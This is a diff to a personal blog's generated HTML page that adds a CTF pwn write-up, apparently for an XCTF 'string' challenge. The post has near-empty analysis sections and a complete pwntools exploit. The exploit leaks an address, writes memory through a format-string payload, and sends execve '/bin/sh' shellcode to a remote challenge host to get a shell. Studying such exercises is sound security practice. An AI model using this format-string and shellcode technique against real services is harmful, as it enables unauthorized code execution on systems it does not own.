@@ -261,6 +261,154 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/string/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/27/string/" itemprop="url">string</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T14:23:40+08:00">
+                2019-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
+                    <span itemprop="name">攻防世界</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/string1.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">除了PIE，其他保护全开</span><br><span class="line"></span><br><span class="line">ida分析</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("/home/xfgg/Downloads/string")</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,34288)</span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">n = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="built_in">print</span> n[:-1]</span><br><span class="line"><span class="built_in">print</span> int(n[:-1],16)</span><br><span class="line">addrs = int(n[:-1],16)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"addrs: "</span> + hex(addrs)</span><br><span class="line">p.recvuntil(<span class="string">'name be:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"susan"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'or up?:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"east"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'\n"</span>)</span><br><span class="line">p.sendline(str(addrs))</span><br><span class="line">p.recvuntil(<span class="string">'you wish is:\n'</span>)</span><br><span class="line">payload = <span class="string">"%85c"</span> + <span class="string">"%7<span class="variable">$n</span>"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'USE YOU SPELL\n'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/rang和srand函数的使用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -586,7 +734,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
